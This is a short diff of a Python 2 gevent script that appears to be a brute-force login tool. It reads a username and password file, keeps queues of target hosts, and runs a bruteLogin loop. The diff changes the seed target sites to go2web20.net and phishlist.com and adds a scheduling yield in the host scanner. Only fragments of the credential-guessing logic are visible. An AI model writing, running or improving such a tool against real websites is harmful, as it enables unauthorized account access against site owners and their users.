@@ -13,12 +13,11 @@ passwdFile = 'userpass.txt'
 hosts = queue.Queue()
 hostpool=queue.Queue()
 hostset=set()
-hostpool.put("http://web.de")
-hostset.add("http://web.de")
-hostpool.put("http://www.hao123.com")
-hostset.add("http://www.hao123.com")
+hostpool.put("http://www.go2web20.net")
+hostset.add("http://www.go2web20.net")
 
-hostset.add("http://www.w3.org")
+hostpool.put("http://phishlist.com")
+hostset.add("http://phishlist.com")
 def bruteLogin(dic):
     while True:
         if hosts.empty():
@@ -47,6 +46,8 @@ def bruteLogin(dic):
         
 def scanhost():
     while True:
+        if (hostpool.qsize()>hosts.qsize()) and (not hosts.empty()) :
+            gevent.sleep(0)
         if hostpool.empty():
             print 'no host'
         host=hostpool.get()
